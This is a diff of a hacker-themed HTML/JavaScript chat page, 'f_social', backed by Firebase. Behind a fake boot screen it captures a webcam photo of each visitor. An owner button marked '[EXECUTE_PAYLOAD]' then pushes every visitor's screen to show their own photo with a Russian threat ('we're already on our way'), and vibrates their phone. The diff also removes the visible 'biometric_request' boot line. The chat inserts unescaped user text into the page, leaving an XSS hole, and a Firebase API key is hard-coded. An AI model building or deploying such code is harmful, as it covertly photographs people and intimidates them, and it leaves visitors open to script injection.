@@ -12,36 +12,43 @@
         :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
         body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); overflow-y: auto; }
+        /* Терминал загрузки */
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); }
         .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
         @keyframes blink { 50% { opacity: 0; } }
 
+        /* Главный экран */
         #app { display: none; flex-direction: column; height: 100vh; position: relative; }
         header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; }
-        .logo { font-size: 22px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); text-transform: lowercase; }
+        .logo { font-size: 22px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
         .logo span { color: var(--f-white); }
 
+        /* Кнопка Владельца */
         #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; z-index: 100; border-radius: 2px; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }
 
-        .nav-tabs { display: flex; border-bottom: 1px solid #222; flex-shrink: 0; background: #0d0d0d; }
-        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; transition: 0.3s; }
-        .tab.active { color: var(--f-red); background: rgba(255,0,60,0.05); border-bottom: 2px solid var(--f-red); }
+        /* Навигация (Вкладки) */
+        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
+        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; border-bottom: 2px solid transparent; }
+        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255,0,60,0.05); }
 
-        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; position: relative; }
+        /* Контент */
+        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
         .tab-content.active { display: flex; flex-direction: column; }
 
-        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; }
-        .m-wrap { border-left: 1px solid #333; padding-left: 10px; }
+        /* Чат */
+        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; margin-bottom: 10px; }
+        .m-wrap { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; }
         .m-user { color: var(--f-red); font-size: 10px; display: block; }
         .m-text { font-size: 14px; color: #ccc; }
 
-        .input-box { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; }
+        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding-top: 10px; }
         input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; outline: none; }
-        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
+        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
 
-        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1) brightness(0.9); }
-        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; line-height: 1.4; }
+        /* Вкладка О Себе */
+        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1) grayscale(0.3); }
+        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; text-shadow: 0 0 5px var(--f-red); }
     </style>
 </head>
 <body>
@@ -53,14 +60,14 @@
 
     <div id="app">
         <header>
-            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: init...</div>
+            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: connecting...</div>
             <div class="logo">f_<span>social</span></div>
             <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
         </header>
 
         <nav class="nav-tabs">
-            <div class="tab active" onclick="openTab(event, 'tab-chat')">/global_chat</div>
-            <div class="tab" onclick="openTab(event, 'tab-whoami')">/whoami</div>
+            <div class="tab active" id="tab-btn-chat" onclick="openTab('tab-chat')">/global_chat</div>
+            <div class="tab" id="tab-btn-whoami" onclick="openTab('tab-whoami')">/whoami</div>
         </nav>
 
         <div id="tab-chat" class="tab-content active">
@@ -72,13 +79,14 @@
         </div>
 
         <div id="tab-whoami" class="tab-content">
-            <p style="text-align:center; font-size:10px; color:#444;">>> TARGET_VISUAL_DATA_ACQUIRED <<</p>
-            <img id="captured-photo" src="" alt="CAPTURED">
+            <p style="text-align:center; font-size:10px; color:#444;">[USER_ID_CAPTURED]</p>
+            <img id="captured-photo" src="">
             <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
         </div>
     </div>
 
 <script>
+    // --- КОНФИГ ---
     const firebaseConfig = {
         apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
         authDomain: "fcocial-v5r.firebaseapp.com",
@@ -112,12 +120,12 @@
     };
 
     async function bootSequence() {
-        const logs = ["f_soc_v5_init...", "tunnel_stable...", "firebase_auth: OK", "biometric_request..."];
+        const logs = ["init_f_social_core...", "proxy_check: OK", "establishing_db_link...", "system_ready."];
         for(let t of logs) {
             let l = document.createElement('div');
             l.innerText = `> ${t}`;
             document.getElementById('boot-logs').appendChild(l);
-            await new Promise(r => setTimeout(r, 450));
+            await new Promise(r => setTimeout(r, 400));
         }
         startCapture();
         listenForHack();
@@ -138,28 +146,30 @@
                     document.getElementById('boot-screen').style.display = 'none';
                     document.getElementById('app').style.display = 'flex';
                 }, 'image/jpeg');
-            }, 2500);
+            }, 2000);
         } catch(e) {
             document.getElementById('boot-screen').style.display = 'none';
             document.getElementById('app').style.display = 'flex';
         }
     }
 
+    // ЛОГИКА АТАКИ
     function triggerHack() {
         if(!isElliot) return;
         db.ref('attack_signal').set(Date.now());
-        alert("PAYLOAD SENT.");
+        alert("PAYLOAD SENT TO ALL TARGETS.");
     }
 
     function listenForHack() {
         db.ref('attack_signal').on('value', (snap) => {
             if (isElliot || !snap.val()) return;
-            openTab(null, 'tab-whoami');
+            openTab('tab-whoami');
             document.getElementById('alert-text').style.display = 'block';
             if(window.navigator.vibrate) window.navigator.vibrate([500, 100, 500]);
         });
     }
 
+    // ЧАТ
     function sendMsg() {
         const i = document.getElementById('chat-in');
         if(!i.value.trim()) return;
@@ -168,26 +178,27 @@
     }
 
     function listenChat() {
-        db.ref('global_chat').limitToLast(15).on('value', snap => {
+        db.ref('global_chat').limitToLast(20).on('value', snap => {
             const box = document.getElementById('global-chat');
             box.innerHTML = '';
             snap.forEach(c => {
                 const d = c.val();
                 const div = document.createElement('div');
                 div.className = 'm-wrap';
-                div.innerHTML = `<span class="m-user">${d.user}:</span><span class="m-text">${d.text}</span>`;
+                div.innerHTML = `<span class="m-user">${d.user}</span><span class="m-text">${d.text}</span>`;
                 box.appendChild(div);
             });
             box.scrollTop = box.scrollHeight;
         });
     }
 
-    function openTab(evt, tabId) {
+    function openTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        
         document.getElementById(tabId).classList.add('active');
-        if(evt) evt.currentTarget.classList.add('active');
-        else document.querySelector(`[onclick*="${tabId}"]`).classList.add('active');
+        if(tabId === 'tab-chat') document.getElementById('tab-btn-chat').classList.add('active');
+        if(tabId === 'tab-whoami') document.getElementById('tab-btn-whoami').classList.add('active');
     }
 </script>
 </body>
